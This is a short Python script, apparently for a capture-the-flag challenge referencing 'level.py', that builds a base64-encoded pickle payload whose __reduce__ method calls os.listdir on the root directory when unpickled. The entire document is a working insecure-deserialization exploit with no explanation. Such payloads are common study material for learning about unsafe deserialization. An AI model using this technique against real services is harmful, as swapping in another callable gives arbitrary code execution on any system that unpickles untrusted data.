class test:
    def __init__(self,id) -> None:
        self.id=id
    def __reduce__(self):
        import os
        return os.listdir,("/",)
import pickle,uuid,base64
print(base64.b64encode(pickle.dumps(test(open("level.py")))).decode())